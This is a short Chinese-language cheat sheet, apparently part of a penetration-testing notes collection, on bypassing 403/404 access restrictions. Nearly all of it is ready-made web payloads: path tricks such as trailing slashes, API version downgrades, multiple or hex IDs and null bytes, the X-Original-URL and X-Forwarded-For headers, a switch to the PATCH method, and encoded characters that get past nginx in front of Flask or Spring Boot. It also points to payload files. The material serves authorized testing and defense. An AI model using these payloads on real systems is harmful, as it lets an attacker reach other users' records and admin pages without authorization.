响应绕过
========================================

403/404响应绕过
----------------------------------------

业务种类
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ 应用层面403
+ 反向代理403
    - nginx
    - apache
    - iis

URL绕过
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ 尾部增加/
    - ``/api/v5/users/9`` -> ``/api/v5/users/10/``
    - ``/api/v5/users/9`` -> ``/api/v5/users//10//``
+ 版本降级
    - ``/api/v5/users/9`` -> ``/api/v4/users/10``
    - ``/api/v5/users/9`` -> ``/api/v3/users/10``
+ 端点枚举
    - ``/api/v5/users/9`` -> ``/api/v5/users/9/details``
+ 多id
    - ``/api/v5/users/9`` -> ``/api/v5/users/9,8``
    - ``/api/v5/users/9`` -> ``/api/v5/users?id=10,9``
+ 类型混淆
    - ``/api/v5/users/9`` -> ``/api/v5/users/*9*``
    - ``/api/v5/users/9`` -> ``/api/v5/users/9abc``
+ 数字类型
    - ``/api/v5/users/9`` -> ``/api/v5/users/0x10``
+ NULL
    - ``/api/v5/users/9`` -> ``/api/v5/users/9%00``
    - ``/api/v5/users/9`` -> ``/api/v5/users/9%00//``
+ 增加标头
    - ``X-Original-URL: /api/v5/users/10``
    - ``X-Forwarded-For: /api/v5/users/10``
    - 参考： ``srcPython\src\payloads\403_header_payloads.txt``
+ 空格编码
    - ``/api/v5/users/9`` -> ``/api/v5/users/%209``
    - 参考： ``srcPython\src\payloads\403_url_payloads.txt``

PATCH绕过
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ ``GET /api/v5/users/9`` -> ``PATCH /api/v5/users/9``

nginx + flask绕过
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ ``GET /admin%85``
+ ``GET /admin%a0``

nginx + springboot绕过
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ ``GET /admin%09``
+ ``GET /admin%3b``